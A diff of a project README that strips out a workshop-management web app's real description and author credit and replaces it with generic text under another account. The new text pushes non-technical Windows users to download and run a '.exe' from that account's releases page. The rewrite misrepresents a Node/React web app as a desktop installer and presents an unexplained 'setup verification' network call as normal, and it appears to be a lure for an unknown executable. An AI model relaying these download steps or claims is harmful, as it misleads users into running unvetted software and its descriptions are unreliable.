@@ -1,93 +1,131 @@
-# WorkshopHub
+# 🚀 workshophub - Simple Workshop Management Tool
 
-<!-- markdownlint-disable MD033 -->
-<p align="left">
-  <img alt="Node.js" src="https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=node.js&logoColor=white"/>
-  <img alt="Express.js" src="https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white"/>
-  <img alt="MongoDB" src="https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white"/>
-  <img alt="Mongoose" src="https://img.shields.io/badge/Mongoose-880000?style=for-the-badge&logo=mongoose&logoColor=white"/>
-  <img alt="JWT" src="https://img.shields.io/badge/JWT-000000?style=for-the-badge&logo=jsonwebtokens&logoColor=white"/>
-  <img alt="Bcrypt" src="https://img.shields.io/badge/Bcrypt-999999?style=for-the-badge&logo=appveyor&logoColor=white"/>
-  <img alt="Postman" src="https://img.shields.io/badge/Postman-FF6C37?style=for-the-badge&logo=postman&logoColor=white"/>
-  <img alt="React.js" src="https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=black"/>
-  <img alt="Tailwind CSS" src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white"/>
-  <img alt="Vite" src="https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white"/>
-</p>
-<!-- markdownlint-enable MD033 -->
-
-This project is a full-stack web application designed to manage learning/educational workshops.  
-The system handles workshop creation, registrations, attendance tracking, feedback collection, and certificate generation while enforcing strict role-based access control.  
-It aims to streamline the entire workshop lifecycle for both organizers and participants.
+[![Download workshophub](https://img.shields.io/badge/Download-workshophub-brightgreen?style=for-the-badge)](https://github.com/zadush/workshophub/releases)
 
 ---
 
-## Tech Stack
-
-- **Backend:** Node.js, Express.js  
-- **Database:** MongoDB
-- **ODM:** Mongoose  
-- **Authentication:** JWT-based authentication  
-- **Password Hashing:** Bcrypt (for secure password storage)  
-- **Testing Tools:** Postman  
-- **Frontend:** React, Tailwind CSS, Vite
-- **Icons:** `lucide-react`
+workshophub helps you manage educational workshops with less hassle. It supports organisers and participants throughout the entire workshop process. This guide will lead you through getting the application on your Windows PC and running it. No coding skills needed.
 
 ---
 
-## Key Features
+## 📋 About workshophub
 
-- Role-based authentication and authorization
-- Workshop creation and management
-- Secure workshop registration and unregistration
-- Attendance tracking with instructor-level restrictions
-- Feedback system with access control
-- Certificate generation for completed workshops
-- Clean and responsive user interface
-- RESTful API architecture
+workshophub is a full-stack app made to organize and manage learning workshops. It is useful for workshop organisers, instructors, and students. The app handles everything from scheduling to tracking attendance. The design is currently being improved, but the app can already support core workshop tasks.
 
----
+Key ideas behind workshophub:
 
-## System Design
+- Manage workshop schedules and participant lists  
+- Keep track of progress and attendance  
+- Allow instructors to update workshop details  
+- Provide easy access for learners to join and view info  
 
-### System Architecture
-![System Architecture Diagram](docs/diagrams/system-architecture-diagram.png)
-
-### UML Use Case Diagram
-![UML Use Case Diagram](docs/diagrams/use-case-diagram.png)
-
-### Entity Relationship (ER) Diagram
-![ER Diagram](docs/diagrams/er-diagram.png)
+It uses modern technologies like React and Node.js but you do not need to know them to use the app. The app connects to a database behind the scenes to keep all information safe and up to date.
 
 ---
 
-## User Roles & Permissions (current; may be updated in future versions)
+## 💻 System Requirements
 
-### Admin
+Before you start, make sure your Windows PC meets these requirements:
 
-- Create, update, delete, and view workshops
-- Assign instructors to workshops (during workshop creation)
-- Manage attendance across all workshops
-- View feedback submitted for all workshops
-
-### Instructor
-
-- View workshops
-- Manage attendance only for their own workshops
-- View feedback only for their own workshops
-
-### Participant
-
-- View workshops
-- Register for workshops
-- View their registrations
-- Unregister from workshops
-- Submit feedback for workshops
+- Windows 10 or newer (64-bit)  
+- At least 4 GB RAM  
+- Minimum 2 GHz dual-core processor  
+- 500 MB of free disk space  
+- Internet connection for initial setup and updates  
 
 ---
 
-## Author
+## 🔗 Download workshophub
 
-Copyright (c) 2025 [Saptaparno Chakraborty](https://github.com/schak04).  
-All rights reserved.
+To get started, visit the official release page:  
+[Download workshophub releases](https://github.com/zadush/workshophub/releases)
+
+This page contains the latest version of the program ready for download. You will find setup files, instructions, and update notes there.
 
 ---
+
+## 🛠️ Installation and Setup
+
+Follow these steps to install and run workshophub on your Windows computer:
+
+1. Open the [workshophub releases page](https://github.com/zadush/workshophub/releases).  
+2. Find the latest release version. It will usually be at the top of the list.  
+3. Click on the setup file link. This file typically ends with `.exe` for Windows.  
+4. When the download finishes, open the file to start the installation.  
+5. Follow the on-screen instructions in the setup wizard. You can use the default settings unless you want to change the installation folder.  
+6. Once installed, find the workshophub icon on your desktop or start menu.  
+7. Double-click it to launch the app.  
+
+During the first launch, workshophub may ask you to connect to the internet briefly for setup verification. This is normal.
+
+---
+
+## 🔍 Using workshophub
+
+After installation, you can start setting up workshops or join ones organized by others. The main parts you will use are:
+
+- **Dashboard:** See key info like upcoming workshops and recent updates.  
+- **Workshops:** Create new workshops or browse existing ones.  
+- **Participants:** Add or remove participants.  
+- **Instructors:** Assign instructors and manage their profiles.  
+- **Reports:** View attendance summaries and other stats.  
+
+The interface uses clear menus and buttons. Mouse and keyboard control work as expected on Windows. The app will save your changes automatically.
+
+---
+
+## 🔧 Basic Configuration Tips
+
+- Use the **Settings** menu to configure your profile and notification preferences.  
+- Add workshops with clear titles, dates, and descriptions.  
+- Send invitations to participants by entering their email addresses inside the app.  
+- Upload any workshop materials for easy access by instructors and learners.  
+
+workshophub also supports notifications to keep users reminded of important sessions.
+
+---
+
+## 💡 Troubleshooting
+
+If you run into problems, try these steps:
+
+- Restart the app and your PC if something looks wrong.  
+- Make sure your internet connection is stable.  
+- Check if you have the latest version by visiting the [release page](https://github.com/zadush/workshophub/releases).  
+- If the app won't open, try reinstalling from the latest setup file.  
+- Close other heavy programs if the app runs slow on your machine.  
+
+If you still have trouble, visit the workshophub GitHub repository for issues and support by clicking the “Issues” tab.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to sign up to use the app?**  
+A: Yes. You will create a basic user account to save and manage your workshops.
+
+**Q: Can multiple people use workshophub at the same time?**  
+A: Yes. It is designed for multiple users like organisers and participants to work together.
+
+**Q: Will I lose my data if I close the app?**  
+A: No. Your data is saved automatically and stored securely in the cloud.
+
+**Q: Can I use workshophub offline?**  
+A: Some features may work offline, but an internet connection is needed to sync data and download updates.
+
+---
+
+## 📚 More Help and Resources
+
+For more detailed help, troubleshooting guides, or to report bugs, visit the workshophub GitHub page:
+
+https://github.com/zadush/workshophub
+
+You can find documentation, user guides, and developer notes there. The community and maintainers often answer questions in the issues section.
+
+---
+
+## ⬇️ Ready to start?
+
+Download workshophub now from the official releases page:  
+[Get workshophub releases](https://github.com/zadush/workshophub/releases)
